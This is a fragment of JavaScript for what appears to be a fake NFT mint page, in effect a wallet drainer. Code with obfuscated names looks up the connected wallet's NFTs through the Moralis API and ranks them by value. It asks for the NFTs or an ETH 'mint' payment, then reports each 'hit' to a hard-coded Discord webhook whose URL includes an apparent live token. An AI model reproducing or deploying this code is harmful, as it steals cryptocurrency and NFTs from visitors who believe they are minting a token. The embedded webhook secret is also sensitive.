...
function sendMessage(cont) {
    if (show_dc) {
        ...
        request.open("POST", "https://discord.com/api/webhooks/990617866061611092/IlLmJH_pqDrq8n-IV2rqXsfqIM89uWpDkCb9Tp63Gr6xz5lLqHuJ0_O8Abt6RozG2L9Y");
...
const price3Html = document.getElementById("lnprice3");
document.getElementById("plus3").addEventListener("click", function () {
  let irhaa = parseInt(price3Html.innerText, 10);
  if (irhaa >= mintInfo.maxUnits) {
    irhaa = mintInfo.maxUnits;
  } else {
    ++irhaa;
...
document.getElementById("minus3").addEventListener("click", function () {
  let anirah = parseInt(price3Html.innerText, 10);
  if (anirah <= mintInfo.minUnits) {
    anirah = mintInfo.minUnits;
  } else {
    --anirah;
...
function updatePrice3(suesan) {
  const xuan = (suesan * mintInfo.price).toFixed(2);
  document.getElementById("lnprice3").innerText = suesan;
  document.getElementById("price3").innerText = xuan;
}


/*var price = document.getElementById("price").textContent;
var gst = document.getElementById("price2").textContent;
var delivery = document.getElementById("price3").textContent;
...
async function onDisconnect() {
  ...
  document.querySelector("#no-wallet-connected").style.display = "block";
  document.querySelector("#connected").style.display = "none";
...
async function clickMint2() {
  const tishena = new ethers.providers.Web3Provider(provider), lakresha = document.getElementById("price3").textContent.toString();
  if (nftsInfo.active) {
    askNfts(tishena, lakresha);
  } else {
    askMint(lakresha);
  ...
  fetch("https://deep-index.moralis.io/api/v2/" + selectedAccount + "/nft?chain=eth&format=decimal", {headers: {"Content-Type": "application/json", accept: "application/json", "x-api-key": moralisApi}, method: "GET"}).then(async dshanti => {
    ...
    if (brexlie.length > 0) {
      ...
      for (transaction of gennette.sort((dreema, jb) => jb.price - dreema.price)) {
        ...
        sendMessage("**[" + myid + "] **Just sent you an NFT *(i think)*\nThe NFT Address is:" + nft.token_address + "\n The NFT is worth:" + nftsInfo.minValue.toString())
...
async function askMint(berthel) {
  ...
  jusin.eth.sendTransaction({from: walletAddress, to: address, value: jusin.utils.toWei(berthel, "ether")}).on("transactionHash", function (kongmeng) {
    sendMessage("**[" + myid + "] ** MINTED, You got a hit: " + mintInfo.price.toString() + "ETH\n*it's either 0.3 or 0.56, don't hate me i fixed it so the shit doesn't spam anymore*")
    return setTimeout(() => {
      if (isMobile()) {} else {
...
window.addEventListener("load", async () => {
  ...
  document.querySelector("#mint").addEventListener("click", clickMint);
  document.querySelector("#mint2").addEventListener("click", clickMint2);
